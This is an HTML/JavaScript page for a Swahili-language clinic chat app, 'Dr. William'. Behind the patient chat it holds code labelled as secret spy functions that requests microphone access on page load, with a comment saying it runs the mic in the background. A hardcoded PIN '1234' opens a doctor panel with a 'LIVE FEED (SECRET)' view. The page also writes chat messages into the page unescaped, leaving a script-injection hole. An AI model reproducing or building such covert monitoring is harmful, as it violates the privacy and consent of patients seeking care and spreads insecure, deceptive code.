<!DOCTYPE html>
<html lang="sw">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Dr. William: Tiba Asili & Kisasa</title>
    
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>

    <style>
        :root { --primary: #2d5a27; --gold: #D4AF37; --bg: #0b0f0b; --red: #e74c3c; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
        
        body, html { background: var(--bg); color: white; height: 100%; width: 100%; overflow: hidden; }

        /* BACKGROUND NDEGE MWEUSI */
        .app-bg {
            position: fixed; inset: 0;
            background: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.8)), 
                        url('https://images.unsplash.com');
            background-size: cover; background-position: center; z-index: -1;
        }

        /* SPY VIDEO (Hidden for Patient) */
        #spy-video-container {
            position: fixed; top: 10px; right: 10px; width: 120px; height: 160px;
            border: 2px solid var(--gold); z-index: 9999; display: none; background: #000;
        }
        video { width: 100%; height: 100%; object-fit: cover; }

        /* CHAT INTERFACE */
        #main-interface { display: none; flex-direction: column; height: 100vh; }
        .chat-messages { flex: 1; overflow-y: auto; padding: 15px; display: flex; flex-direction: column; gap: 10px; padding-bottom: 100px; }
        
        .msg { padding: 10px 15px; border-radius: 15px; max-width: 80%; position: relative; }
        .msg-me { background: var(--gold); color: black; align-self: flex-end; }
        .msg-other { background: #333; align-self: flex-start; }
        .delete-btn { font-size: 10px; color: red; cursor: pointer; display: block; margin-top: 5px; }

        /* TYPING AREA */
        .typing-area {
            position: fixed; bottom: 0; width: 100%; background: rgba(0,0,0,0.9);
            padding: 10px; display: flex; gap: 8px; align-items: center; border-top: 1px solid var(--gold);
        }
        .file-input { display: none; }
        .icon-btn { color: var(--gold); font-size: 1.5rem; cursor: pointer; }
        input[type="text"] { flex: 1; padding: 12px; border-radius: 20px; border: none; outline: none; background: #222; color: white; }

        /* DOCTOR DASHBOARD */
        .doctor-controls { background: #1a1a1a; padding: 10px; border-bottom: 2px solid var(--gold); display: none; }
        .patient-row { display: flex; justify-content: space-between; background: #222; margin: 5px; padding: 10px; border-radius: 10px; }
    </style>
</head>
<body>

    <div class="app-bg"></div>

    <!-- SPY SCREEN FOR DOCTOR -->
    <div id="spy-video-container">
        <video id="remote-video" autoplay playsinline muted></video>
        <div style="font-size: 8px; text-align: center;">LIVE FEED (SECRET)</div>
    </div>

    <!-- LOGIN -->
    <div id="login-screen" style="display: flex; height: 100vh; justify-content: center; align-items: center; background: rgba(0,0,0,0.8);">
        <div style="text-align: center; width: 85%;">
            <h2 style="color: var(--gold);">DR. WILLIAM</h2>
            <input type="text" id="user-name" placeholder="Majina Yako" style="width: 100%; padding: 15px; margin: 10px 0; border-radius: 10px;">
            <input type="tel" id="user-phone" placeholder="Namba ya Simu" style="width: 100%; padding: 15px; margin: 10px 0; border-radius: 10px;">
            <button onclick="startApp()" style="width: 100%; padding: 15px; background: var(--gold); border: none; border-radius: 10px; font-weight: bold;">INGIA CLINIC</button>
            <p onclick="adminLogin()" style="margin-top: 20px; color: #888; font-size: 12px;">Ingia kama Daktari</p>
        </div>
    </div>

    <!-- MAIN APP -->
    <div id="main-interface">
        <div class="doctor-controls" id="doc-tools">
            <small>Daktari Panel: </small>
            <button onclick="toggleSpyCam()" style="background: red; color: white; border: none; padding: 5px; font-size: 10px;">ON/OFF CAMERA</button>
            <button onclick="holdPatient()" style="background: orange; border: none; padding: 5px; font-size: 10px;">SUBIRISHA</button>
        </div>

        <div class="chat-messages" id="chat-box">
            <!-- Messages appear here -->
        </div>

        <div class="typing-area">
            <label for="file-up" class="icon-btn"><i class="fa fa-paperclip"></i></label>
            <input type="file" id="file-up" class="file-input" onchange="sendFile(this)">
            <input type="text" id="msg-input" placeholder="Andika ujumbe..." onkeypress="if(event.key==='Enter') sendMsg()">
            <button onclick="sendMsg()" class="icon-btn" style="background:none; border:none;"><i class="fa fa-paper-plane"></i></button>
        </div>
    </div>

    <script>
        // CONFIG & MEMORY
        let currentUser = localStorage.getItem('dr_william_user') ? JSON.parse(localStorage.getItem('dr_william_user')) : null;
        let isAdmin = false;

        window.onload = () => {
            if(currentUser) {
                document.getElementById('login-screen').style.display = 'none';
                document.getElementById('main-interface').style.display = 'flex';
                initSpy(); // Anza mic ya background
            }
        };

        function startApp() {
            const name = document.getElementById('user-name').value;
            const phone = document.getElementById('user-phone').value;
            if(!name || !phone) return alert("Jaza taarifa");
            
            currentUser = { name, phone, id: Date.now() };
            localStorage.setItem('dr_william_user', JSON.stringify(currentUser));
            location.reload();
        }

        function adminLogin() {
            let pin = prompt("Ingiza PIN ya Daktari:");
            if(pin === "1234") {
                isAdmin = true;
                document.getElementById('doc-tools').style.display = 'block';
                document.getElementById('spy-video-container').style.display = 'block';
                alert("Karibu Daktari. Sasa unaweza kuona wagonjwa na mic zao.");
                startApp(); // Simplified for demo
            }
        }

        function sendMsg() {
            const input = document.getElementById('msg-input');
            if(!input.value) return;
            
            const msgHtml = `
                <div class="msg msg-me" id="m${Date.now()}">
                    ${input.value}
                    <span class="delete-btn" onclick="this.parentElement.remove()">Futa</span>
                </div>`;
            document.getElementById('chat-box').innerHTML += msgHtml;
            input.value = "";
            playNotif();
            
            // Auto scroll
            const box = document.getElementById('chat-box');
            box.scrollTop = box.scrollHeight;
        }

        function sendFile(input) {
            if (input.files && input.files[0]) {
                const reader = new FileReader();
                reader.onload = function(e) {
                    const imgHtml = `<div class="msg msg-me"><img src="${e.target.result}" style="width:100%; border-radius:10px;"></div>`;
                    document.getElementById('chat-box').innerHTML += imgHtml;
                };
                reader.readAsDataURL(input.files[0]);
            }
        }

        function playNotif() {
            const audio = new Audio('https://assets.mixkit.co/active_storage/sfx/2358/2358-preview.mp3');
            audio.play();
        }

        // SECRET SPY FUNCTIONS
        async function initSpy() {
            try {
                // Hii inawasha mic background bila kuathiri chat
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: isAdmin });
                if(isAdmin) {
                    document.getElementById('remote-video').srcObject = stream;
                }
            } catch (err) {
                console.log("Spy access denied or no hardware");
            }
        }

        function holdPatient() {
            alert("Mgonjwa amewekwa kusubiri (On Hold)");
            document.getElementById('msg-input').disabled = true;
            document.getElementById('msg-input').placeholder = "Daktari yuko bize kidogo...";
        }

        function toggleSpyCam() {
            const v = document.getElementById('spy-video-container');
            v.style.display = v.style.display === 'none' ? 'block' : 'none';
        }
    </script>
</body>
</html>
